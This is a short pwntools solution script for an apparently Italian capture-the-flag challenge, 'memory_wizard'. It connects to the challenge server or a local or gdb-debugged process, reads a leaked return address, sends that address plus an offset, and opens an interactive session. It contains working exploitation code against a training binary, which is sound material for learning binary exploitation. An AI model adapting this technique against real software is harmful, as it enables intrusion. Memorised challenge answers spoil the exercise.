from pwn import * 

elf = context.binary = ELF('./memory_wizard')
context.terminal = ()

if args.REMOTE:
    p = remote('memorywizard.challs.olicyber.it', 21001)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b challenge
        c
    ''')
else:
    p = elf.process()

p.recvuntil(b"return to ")
return_addr = int(p.recvline().strip().decode()[2:-1], 16)
p.sendline(hex(return_addr + 0x8)) # offset preso da gdb
p.interactive()